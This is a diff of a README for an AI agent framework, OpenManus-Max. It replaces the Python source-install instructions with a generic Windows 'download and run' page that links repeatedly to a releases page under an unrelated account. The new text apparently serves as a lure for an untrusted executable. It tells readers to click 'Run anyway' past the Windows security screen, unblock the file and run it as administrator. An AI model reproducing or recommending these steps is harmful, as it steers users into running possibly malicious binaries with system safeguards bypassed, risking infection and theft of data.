@@ -1,122 +1,188 @@
-[English](README.md) | [简体中文](README_zh.md) | [繁體中文](README_zh_TW.md) | [한국어](README_ko.md) | [日本語](README_ja.md)
+# 🧠 OpenManus-Max - Run Advanced AI Workflows
 
-<div align="center">
-  <h1>🚀 OpenManus-Max</h1>
-  <p><strong>An Advanced Autonomous AI Agent Framework with Multi-Level Permissions & Trust Attenuation</strong></p>
+[![Download OpenManus-Max](https://img.shields.io/badge/Download-OpenManus--Max-blue-grey?style=for-the-badge)](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-  [![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-</div>
+## 🚀 What This App Does
 
-## 👋 Introduction
+OpenManus-Max is a Windows app for running advanced AI tasks with less setup. It gives you a guided way to manage complex work, keep context across steps, and use many tools from one place.
 
-OpenManus is great, but **OpenManus-Max** takes it to the next level! 
+Use it for tasks like:
+- Planning multi-step work
+- Keeping notes and task memory
+- Running tool-based actions
+- Controlling access at different levels
+- Handling long workflows with a clear order
 
-Inspired by the sandboxed security of Manus and the local execution flexibility of IronClaw, OpenManus-Max is a fully refactored, enterprise-grade AI Agent framework. It features a **DAG Task Scheduler**, **Hierarchical Memory**, **20+ Built-in Tools**, and a revolutionary **Multi-Level Permission Engine** with **Skill Trust Attenuation**.
+## 💻 What You Need
 
-Whether you want an agent that safely runs in a Docker sandbox, or a fully unleashed local assistant that controls your desktop, OpenManus-Max has you covered.
+OpenManus-Max is made for Windows desktops and laptops.
 
-## ✨ Key Features
+You should have:
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for setup and updates
 
-- 🛡️ **Multi-Level Permission Engine**: Choose between `YOLO` (full access), `STANDARD` (intercepts high-risk), `STRICT` (requires approval), or `SANDBOX` (Docker isolation).
-- 🧩 **Skill System & Trust Attenuation**: Load custom `SKILL.md` files. Third-party skills automatically trigger "Trust Attenuation", stripping the agent of write/execute permissions to prevent prompt injection attacks.
-- 🧠 **Hierarchical Memory**: Working Memory $\rightarrow$ LLM-driven Episodic Summary $\rightarrow$ Global Blackboard.
-- ⚡ **DAG Task Scheduler**: Automatically breaks down complex goals into Directed Acyclic Graphs (DAG) for parallel execution.
-- 🛠️ **20+ Built-in Tools**: Python/Shell execution, Web Search (Multi-engine), Deep Web Crawling, Vision Analysis, Data Visualization, Desktop Automation (RPA), and more.
-- 🔌 **MCP & A2A Protocol**: Built-in Model Context Protocol (MCP) client and Agent-to-Agent (A2A) HTTP server.
-- ⏰ **Routine Daemon**: Run scheduled tasks (Cron/Interval) in the background with SQLite persistence.
+For better results:
+- Use 16 GB of RAM if you plan to run larger tasks
+- Keep enough free space for logs, cache, and model files
+- Close other heavy apps if your PC feels slow
 
-## 🚀 Installation
+## 📥 Download OpenManus-Max
 
-We recommend using `uv` for a faster installation experience.
+Visit the release page to download and run this app:
 
-```shell
-# 1. Clone the repository
-git clone https://github.com/your-repo/OpenManus-Max.git
-cd OpenManus-Max
+[Download from the latest releases page](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
 
-# 2. Create virtual environment
-uv venv --python 3.11
-source .venv/bin/activate
+On that page, look for the latest release and choose the Windows file that matches your PC. In most cases, that will be an `.exe` or `.zip` file.
 
-# 3. Install dependencies
-uv pip install -e ".[all]"
-```
+## 🪟 Install on Windows
 
-## ⚙️ Configuration
+Follow these steps:
 
-Create a `config.toml` file in the root directory (you can copy from `config.example.toml`):
+1. Open the releases page.
+2. Find the newest version at the top of the list.
+3. Download the Windows file.
+4. If you get a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you get an `.exe` file, double-click it to start the app.
+7. If Windows asks for permission, choose Yes.
+8. If Windows shows a security screen, choose More info, then Run anyway if you trust the file source.
 
-```shell
-cp config.example.toml config.toml
-```
+If the app comes as a portable folder, keep all files in the same folder and start the main `.exe` file from there.
 
-Edit `config.toml` to set your API keys and preferred permission mode:
+## 🧭 First Launch
 
-```toml
-[llm]
-model = "gpt-4o"
-base_url = "https://api.openai.com/v1"
-api_key = "sk-..."
+When you open OpenManus-Max for the first time, you may see setup fields for:
+- A user name or profile name
+- An API key or service token
+- A local data folder
+- Permission settings
 
-[permission]
-# Choose from: yolo, standard, strict, sandbox
-mode = "standard"
-```
+Use simple values you can remember. If you are asked for an API key, paste it exactly as provided by your service account.
 
-## 🎯 Quick Start
+If the app offers a guided setup, follow it step by step. If it asks what kind of work you want to do, choose the option that best matches your use case.
 
-Run OpenManus-Max in interactive mode:
+## 🛠️ Main Features
 
-```shell
-openmanus-max
-```
+### 🧠 Hierarchical Memory
+OpenManus-Max can keep related notes in layers. This helps the app remember what matters most for a task and what can stay in the background.
 
-### Other Execution Modes
+### 📋 DAG Scheduler
+The scheduler can order tasks in a clear path. It helps the app move from one step to the next without losing the plan.
 
-```shell
-# Single task mode
-openmanus-max -t "Clean up my Downloads folder"
+### 🔧 20+ Tools
+The app includes many tools for common work such as file handling, text actions, data lookup, and task support.
 
-# YOLO mode (Full local access, no confirmations)
-openmanus-max --mode yolo -t "Analyze system logs and fix errors"
+### 🔐 Multi-Level Permissions
+You can set different trust levels for different actions. This gives you more control over what the app can do.
 
-# Sandbox mode (Safe execution in Docker)
-openmanus-max --mode sandbox -t "Run this untrusted script"
+### 🎛️ Trust Attenuation
+The app can reduce trust for risky tasks and use stricter checks before it acts.
 
-# DAG Planning mode for complex tasks
-openmanus-max --dag "Research AI trends and generate a PPT presentation"
+### 🧩 Refactored Core
+OpenManus-Max uses a cleaned-up structure that is easier to run, maintain, and extend.
 
-# Start Routine Daemon
-openmanus-max --routine
-```
+## 🖱️ How to Use It
 
-## 📚 Skill System
+A simple way to start:
 
-You can extend the agent's capabilities by adding skills to `~/.openmanus-max/skills/`. A skill is simply a directory containing a `SKILL.md` file with YAML frontmatter:
+1. Open the app.
+2. Choose a task type.
+3. Add your goal in plain language.
+4. Let the app break the work into steps.
+5. Review the plan before it runs each action.
+6. Check the output and adjust the prompt if needed.
 
-```markdown
----
-name: github-pr-reviewer
-version: "1.0.0"
-description: Review GitHub Pull Requests
-activation:
-  keywords: ["github", "pr", "review"]
----
-# GitHub PR Reviewer
-When asked to review a PR, follow these steps...
-```
+Example tasks:
+- Summarize a long document
+- Build a step-by-step research plan
+- Organize files by topic
+- Draft a work checklist
+- Compare several text sources
+- Run a task chain with memory across steps
 
-*Note: Skills placed in `~/.openmanus-max/installed/` are treated as untrusted and will automatically attenuate the agent's dangerous tools.*
+## 🔒 Permissions and Safety Controls
 
-## 🤝 Contributing
+OpenManus-Max can use different permission levels for different actions. This helps you decide what the app may read, change, or send.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+Common control areas:
+- File access
+- Network access
+- Tool access
+- Write access
+- High-trust actions
 
-## 📄 License
+If you see a permission prompt, read the action name before you approve it. Keep high-trust actions for tasks you expect.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🧰 Troubleshooting
 
-## 🙏 Acknowledgements
+### App does not open
+- Check that you downloaded the Windows file
+- Make sure the file finished downloading
+- If it is a `.zip`, extract it first
+- Try running the app as administrator
 
-Special thanks to the original [OpenManus](https://github.com/FoundationAgents/OpenManus) team and the [IronClaw](https://github.com/nearai/ironclaw) project for their inspiring architectures.
+### Windows blocks the file
+- Right-click the file and choose Properties
+- Check for an Unblock option near the bottom
+- Apply the change, then open the app again
+
+### The app starts but shows a blank screen
+- Close the app and reopen it
+- Make sure your internet connection is active
+- Check that any required API key is entered
+- Clear the app cache if the app gives you that option
+
+### The app feels slow
+- Close other large apps
+- Restart Windows
+- Use a PC with more memory if you run larger workflows
+- Reduce the number of tools or task steps in one run
+
+### A task fails
+- Check the input for typos
+- Use shorter steps
+- Split one large task into smaller parts
+- Review the permission settings for the tool that failed
+
+## 📁 Suggested Folder Setup
+
+Keep the app in a simple folder path like:
+- `C:\Apps\OpenManus-Max\`
+- `D:\Tools\OpenManus-Max\`
+
+Avoid long folder paths with special characters. This helps prevent file issues on Windows.
+
+## 🔄 Updates
+
+To get new builds:
+1. Return to the releases page
+2. Download the latest Windows file
+3. Replace the older app files if the package requires it
+4. Keep your data folder if you want to preserve settings and history
+
+If the release notes list a new setup step, follow that step before you open the new version.
+
+## 🧾 File Types You May See
+
+- `.exe` — double-click to run
+- `.zip` — extract first, then run
+- `.msi` — follow the Windows installer steps
+- folders with app files — open the main executable inside the folder
+
+## 📌 Best Use Tips
+
+- Start with one simple task
+- Review each step before approval
+- Keep your prompts short and clear
+- Save useful task chains for later
+- Use the memory tools for work that needs context over time
+- Keep permissions tight for actions you do not need
+
+## 📂 Release Page
+
+Use this page to get the current Windows download:
+
+[OpenManus-Max Releases](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
